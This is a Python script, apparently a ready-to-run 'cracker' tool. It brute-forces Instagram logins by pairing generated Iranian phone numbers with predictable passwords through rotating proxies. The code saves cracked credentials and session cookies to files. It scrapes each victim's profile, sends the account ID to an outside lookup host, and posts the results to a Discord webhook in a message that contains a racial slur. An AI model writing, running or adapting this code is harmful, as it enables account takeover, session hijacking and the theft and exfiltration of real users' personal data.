import requests, random, os, uuid, time



class Hack:
    def __init__(self):
        self.done = 0
        self.error = 0
        self.secure = 0
        self.block = 0
        self.webhook = ''#INSERT DISCORD WEBHOOK HERE
        self.url = 'https://b.i.instagram.com/api/v1/accounts/login/'
        self.headers = {'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)'}
        self.uid = str(uuid.uuid4())
        self.banner = """           
                )\  (      )     ( /(   (  (    
                (((_) )(  ( /(  (  )\()) ))\ )(   
                )\___(()\ )(_)) )\((_)\ /((_|()\  
                ((/ __|((_|(_)_ ((_) |(_|_))  ((_)  
                | (__| '_/ _` / _|| / // -_)| '_| 
                \___|_| \__,_\__||_\_\\___||_| 
                
                    by @crackled on tele"""

    def clear(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        print( '……………………………………………………………………………………………………………………………………………………')
        print(self.banner)
        print( '……………………………………………………………………………………………………………………………………………………')
        print(( f"\r                 \n [=] Hit : {self.done} \n [=] Fail : {self.error} \n [=] Secure :  {self.secure}\n [=] Blocked : {self.block}\n [=] User : {self.username} \n [=] Pass : {self.password} "), end='')

    def generate(self, proxy):
        self.proxy = proxy
        users = '0987654321'
        us = str(''.join((random.choice(users) for i in range(7))))
        self.username = '+98935' + us
        self.password = '0935' + us
        self.login()
        

    def login(self):
        r = requests.session()
        if self.proxy:
            file = open('proxies.txt').read().splitlines()
            prox = random.choice(file)
            proxies = {'http': 'http://' + prox, 'https': 'http://' + prox}
            r.proxies.update(proxies)
        data = {'uuid':self.uid,  'password':self.password, 'username':self.username, 'device_id':self.uid, 'from_reg':'false', '_csrftoken':'missing', 'login_attempt_countn':'0'}
        send = r.post(self.url,headers=self.headers,data=data)
        text = send.text
        if 'logged_in_user' in text:
            self.done+=1
            Json = send.json()
            id = send.cookies['sessionid']
            with open('hit.txt','a') as f:
                    f.write(f'{self.username}:{self.password}:{id}\n')
            with open('sessions.txt','a') as f:
                    f.write(f'{id}\n')
            user = Json['logged_in_user']['username']
            self.disc(id,user)
        elif "challenge_required" in text:
            with open('secure.txt','a') as f:
                    f.write(f'{self.username}:{self.password}')
            self.secure+=1
            

        elif send.status_code == 429:
            self.block+=1
        else:
            self.error+=1
        self.clear()

    
    
    def disc(self,id, username):
        head = {'HOST':'www.instagram.com',  'KeepAlive':'True', 'user-agent':'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.73 Safari/537.36', 'Cookie':f'sessionid={id}', 'Accept':'*/*', 'ContentType':'application/x-www-form-urlencoded', 'X-Requested-With':'XMLHttpRequest', 'X-IG-App-ID':'936619743392459', 'X-Instagram-AJAX':'missing', 'X-CSRFToken':'missing', 'Accept-Language':'en-US,en;q=0.9'}
        url_id = f"https://www.instagram.com/{username}/?__a=1"
        try:
            req_id = requests.get(url_id, headers=head).json()
            name = str(req_id['graphql']['user']['full_name'])
            idd = str(req_id['graphql']['user']['id'])
            followes = str(req_id['graphql']['user']['edge_followed_by']['count'])
            following = str(req_id['graphql']['user']['edge_follow']['count'])
            re = requests.get(f"https://o7aa.pythonanywhere.com/?id={idd}")
            ree = re.json()
            dat = ree['data']
            webh = {"content":f" New Hit Nigga: @{username}!","embeds":[{"title":f"Successfully Cracked {username}!","description":f"Status: SUCCESS\n-\nUser ID: {idd}\n-\nName: {name}\n-\nFollowers: {followes}\n-\nFollowing: {following}\n-\nAge: {dat}\n","url":f"https://instagram.com/{username}","color":14177041}],"username":"Cracker Bot.","avatar_url":"https://www.pandasecurity.com/en/mediacenter/src/uploads/2019/07/pandasecurity-How-do-hackers-pick-their-targets.jpg"}
            requests.post(self.webhook,json=webh)
            return True
        except:
            return False




    



if __name__ == '__main__':
    ig = Hack()
    print(ig.banner + '\n')
    choice = input('[+] Use Proxies? (Y/N): ')
    if choice == 'y' or choice == 'Y':proxy=True;print('\n [!] Proxies Activated! ');time.sleep(3)
    else:proxy=False;print('\n [!] Running without proxies! ');time.sleep(3)
    while True:
        ig.generate(proxy)






